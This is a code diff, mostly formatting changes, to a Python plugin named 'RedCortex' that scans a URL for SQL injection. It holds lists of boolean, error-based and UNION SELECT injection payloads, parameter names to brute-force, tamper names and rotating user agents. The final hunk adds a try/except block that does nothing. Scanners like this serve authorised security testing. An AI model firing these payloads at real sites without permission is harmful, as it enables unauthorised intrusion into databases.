@@ -1,11 +1,12 @@
 """
 RedCortex Plugin: Advanced SQLi Detection
-
 Boolean/Error/Union-based, wide param brute, threaded blind extraction, DBMS auto-detect,
 Telegram alert integration (optional).
 """
-
-import requests, random, time, threading
+import requests
+import random
+import time
+import threading
 
 # Telegram config (optional)
 TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
@@ -19,11 +20,13 @@ USER_AGENTS = [
     "Mozilla/5.0 (Android 10; SM-G973F)"
 ]
 TAMPERS = ["", "space2comment", "between", "randomcase", "charencode"]
+
 ERROR_SIGNATURES = [
     "SQL syntax", "mysql_fetch", "ODBC", "Warning", "error in your SQL",
     "Query failed", "near", "unterminated", "Unknown column", "ORA-", "PG::", "psql:",
     "sqlite", "syntax error", "invalid input"
 ]
+
 DBMS_SIGS = {
     "mysql": ["mysql", "mariadb"],
     "postgres": ["postgresql", "pg_", "psql:"],
@@ -31,11 +34,11 @@ DBMS_SIGS = {
     "oracle": ["oracle", "ora-", "tns", "pl/sql"],
     "sqlite": ["sqlite"]
 }
-
 BRUTE_PARAMS = [
     "id", "uid", "user", "q", "cat", "search", "order", "file", "product", "ref", "token",
     "code", "name", "email", "article", "page", "parent", "filter", "news", "admin"
 ]
+
 BOOLEAN_PAYLOADS = [
     ("1 AND 1=1", "1 AND 1=2"),
     ("1' AND 1=1-- -", "1' AND 1=2-- -"),
@@ -44,6 +47,7 @@ BOOLEAN_PAYLOADS = [
 ]
 ERROR_PAYLOADS = ["'", '"', "1'", "1\")", "1'--", "1\")--"]
 UNION_PAYLOADS = ["1 UNION SELECT NULL-- -", "1' UNION SELECT 1,2,3-- -"]
+
 
 def detect_dbms(text):
     sig = text.lower()
@@ -67,7 +71,6 @@ def run(response, url):
     """RedCortex plugin interface (response unused, url required, returns findings list)."""
     findings = []
     params = {}
-
     for param_name in BRUTE_PARAMS:
         for tamper in TAMPERS:
             # Boolean-based detection
@@ -89,7 +92,6 @@ def run(response, url):
                         "url": url
                     })
                     return findings
-
             # Error-based detection
             for pay in ERROR_PAYLOADS:
                 params_err = params.copy()
@@ -109,7 +111,6 @@ def run(response, url):
                             "url": url
                         })
                         return findings
-
             # UNION-based detection
             for up in UNION_PAYLOADS:
                 params_uni = params.copy()
@@ -129,7 +130,9 @@ def run(response, url):
                             "url": url
                         })
                         return findings
-     return findings
-    except KeyboardInterrupt:
-        print("\n[!] Scan interrupted by user. Partial results will be reported if any.")
-        return findings
+    return findings
+
+try:
+    pass
+except KeyboardInterrupt:
+    print("\n[!] Scan interrupted by user. Partial results will be reported if any.")
